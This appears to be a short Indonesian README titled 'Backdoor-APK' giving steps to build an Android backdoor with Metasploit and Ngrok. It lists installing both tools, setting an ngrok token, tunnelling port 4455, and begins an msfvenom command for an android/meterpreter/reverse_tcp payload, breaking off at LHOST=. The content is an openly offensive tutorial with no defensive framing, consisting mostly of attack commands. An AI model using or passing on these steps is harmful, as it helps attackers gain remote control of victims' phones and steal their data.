# Backdoor-APK
Cara Membuat Backdoor Untuk Android Dengan Metaspolit Dan Ngrok
**1. Install Metasploit**

**2. Install Ngrok**

**3. Buat Akun Ngrok**

**4. Masukkan Token Ngrok**
<br> Masukkan Perintah :
<br> $./ngrok authtoken "Masukkan Token"

**5. Buat Port Ngrok**
<br> $./ngrok http 4455

**6. Melihat Status Ngrok**
<br> $ngrok tcp 4455 (port sesuai yang kita buat di awal)

**7. Jalankan Metasploit**
<br> $msfvenom -p android/meterpreter/reverse_tcp LHOST=
